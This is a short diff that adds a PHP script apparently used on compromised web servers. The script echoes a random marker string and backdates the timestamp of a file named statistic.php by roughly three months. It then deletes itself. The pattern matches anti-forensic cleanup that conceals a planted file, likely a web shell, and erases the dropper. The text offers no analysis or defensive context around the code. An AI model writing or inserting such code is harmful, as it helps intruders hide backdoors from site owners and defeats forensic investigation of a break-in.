@@ -1,0 +1,1 @@
+<?php echo "FrmaKXuSWk"; if (file_exists("./statistic.php")){ touch("./statistic.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*A23RGPeKgfXMfZSFGgpR*/ ?>
